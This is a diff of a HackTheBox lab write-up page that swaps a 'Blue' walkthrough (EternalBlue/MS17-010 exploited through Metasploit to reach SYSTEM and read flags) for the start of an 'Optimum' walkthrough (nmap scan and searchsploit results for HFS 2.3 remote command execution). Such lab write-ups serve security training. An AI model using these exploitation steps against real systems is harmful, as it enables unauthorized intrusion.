@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-02-25T20:30:13 EST">
-<title>Blue :: DocDock Documentation</title>
+<title>Optimum :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/hackthebox/boxes/blue/">
+  <body data-url="/hackthebox/boxes/optimum/">
     
       <header>
   <div class="logo">
@@ -142,7 +142,7 @@
         <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item parent active
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
         ">
     <div>
 
@@ -170,7 +170,7 @@
         <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item parent active
         ">
     <div>
 
@@ -433,10 +433,9 @@
     <option value="/hackthebox/boxes/hawk/" >
   -- 
    </option>
-    <option value="/hackthebox/boxes/blue/"  selected>
+    <option value="/hackthebox/boxes/blue/" >
   -- 
-   Blue</option> 
-  
+   Blue</option>
     <option value="/hackthebox/boxes/crimestoppers/" >
   -- 
    CrimeStopper</option>
@@ -446,9 +445,10 @@
     <option value="/hackthebox/boxes/mischief/" >
   -- 
    Mischief</option>
-    <option value="/hackthebox/boxes/optimum/" >
+    <option value="/hackthebox/boxes/optimum/"  selected>
   -- 
-   Optimum</option>
+   Optimum</option> 
+  
     <option value="/hackthebox/boxes/poison/" >
   -- 
    Poison</option>
@@ -504,132 +504,51 @@
       </div>
     
 
-    <h1>Blue</h1>
+    <h1>Optimum</h1>
     
     
     
 
+<p>NMAP</p>
 
-
-<h3 id="blue">Blue</h3>
-
-<p>Special thanks to IppSec for contributing to this post. <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Please Subscribe</a></p>
-
-<p><img src="https://chickenpwny.github.io/images/blue/blue_logo.jpg" alt="blue_logo" /></p>
-
-<p>changes /etc/hosts so 10.10.10.40 blue.htb</p>
-
-<pre><code>PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
-49157/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+<pre><code>nmap -sV -sC 10.10.10.8  
+ 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST                                     
+Nmap scan report for 10.10.10.8                                                                     
+Host is up (0.042s latency).                                                                       
+Not shown: 999 filtered ports                                                                       
+PORT   STATE SERVICE VERSION                                                                       
+80/tcp open  http    HttpFileServer httpd 2.3                                                       
+|_http-server-header: HFS 2.3                                                                       
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 82.62 seconds
-</code></pre>
-
-<p>Windows 7 Professional 7601 Service Pack 1</p>
-
-<p>port 135 = RPC a couple buffer overflow attacks I doubt its vulnerable.</p>
-
-<p>port 139 = NetBIOS is rarely vulnerable you can enumerate the system with it through gathering information</p>
-
-<p>port 445 =  Smb server message block often exploitable. Don&rsquo;t count on it though.</p>
-
-<h3 id="talking-about-enternalblue">Talking about EnternalBlue</h3>
-
-<p>Atleast l wilI try to, for a detailed in-depth explanation <a href="https://research.checkpoint.com/eternalblue-everything-know/">Click Here</a></p>
-
-<p>The exploit MS17-10, aka EternalBlue was used by an Nation State Advisory and after getting leaked and becoming public a different group used it to cryptolocker a good portion of internet connected SMB Hosts. SMB normally isn&rsquo;t connected to the internet, so it is doubtful the exploit is intended to be the initial infection.  It is was an excellent tool to move around a network laterally as SMB is used legitimately by Windows for domain management.  Today, it remains a way to gain SYSTEM access to unpatched system and attempt to find loot that is helpful.</p>
-
-<p>EternalBlue exploits three bugs to achieve RCE</p>
-
-<ol>
-<li>Wrong Casting Bug &ndash; this leads to a buffer overflow</li>
-<li>Wrong Parsing Function Bug &ndash; Using two functions, to trick the system they can&rsquo;t handle large packs so it will split packets into smaller packers. Since the first function breaks it will escape out SMB treats the last function as the first. This allows bug A to work by Treating Dword as word.</li>
-<li>Non-paged Pool Allocation Bug &ndash; creates a hole in the heap stack allowing 1 &amp; 2 to write in memory.</li>
-</ol>
-
-<h3 id="exploiting-blue">Exploiting Blue</h3>
-
-<p>Using nmap to check and make sure the vulnerability exist.</p>
-
-<pre><code><div class="alert 
-alert-danger"
- 
-role="alert"><p>Nmap -p445 &ndash;script vuln blue.htb -T4</p>
-</div>
-
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-24 06:22 EST
-Nmap scan report for blue.htb (10.10.10.40)
-Host is up (0.13s latency).
-
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
-
-Host script results:
-|_smb-vuln-ms10-054: false
-|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
-| smb-vuln-ms17-010:
-|   VULNERABLE:
-|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                                                       
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2017-0143
-|     Risk factor: HIGH
-|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                    
-|        servers (ms17-010).
-|
-|     Disclosure date: 2017-03-14
-|     References:
-|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/                                               
-|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
-
-Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
-
+Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
 
 </code></pre>
 
-<p>Now, go into Metasploit. While running the exploit. It will fail a couple times so wait patiently for it to return a shell.</p>
+<p>SEARCHSPLOIT</p>
 
-<pre><code>msfconsole 
-
-search lue
-
-exploit/windows/smb/ms17_010_eternalblue    MS17-010 EternalBlue SMB Remote Windows
-
-use exploit/windows/smb/ms17_010_eternalblue
-
-set RHOST 10.10.10.40
-
-run
-
+<pre><code>searchsploit hfs
+--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                       |  Path
+                                                                                                                     | (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                    | exploits/osx/dos/29454.txt
+Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                                              | exploits/osx/dos/12375.c
+Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                          | exploits/osx/local/35488.c
+Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                                   | exploits/osx/local/8266.txt
+FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                           | exploits/windows/remote/37985.py
+Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                          | exploits/linux/dos/28895.txt
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                               | exploits/windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                    | exploits/windows/remote/31056.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                       | exploits/multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                  | exploits/windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                  | exploits/windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                             | exploits/windows/webapps/34852.txt
+--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 </code></pre>
-
-<p><img src="https://chickenpwny.github.io/images/blue/metasploit_blue.PNG" alt="metasploit_blue" /></p>
-
-<p>The user flag is in c:\Users\haris\Desktop</p>
-
-<div class="alert 
-alert-info"
- 
-role="alert">type user.txt</div>
-
-
-<p>The root flag is in c:\Users\Adimistrator\Desktop</p>
-
-<div class="alert 
-alert-success"
- 
-role="alert">type root.txt</div>
-
 
 
 
@@ -637,8 +556,8 @@ role="alert">type root.txt</div>
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/hawk/" title=""> <i class="fa fa-chevron-left"></i><label></label></a>
-    <a class="nav nav-next" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper" style="margin-right: 0px;"><label>CrimeStopper</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/mischief/" title="Mischief"> <i class="fa fa-chevron-left"></i><label>Mischief</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -655,7 +574,7 @@ role="alert">type root.txt</div>
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/Blue/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/optimum/_index.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
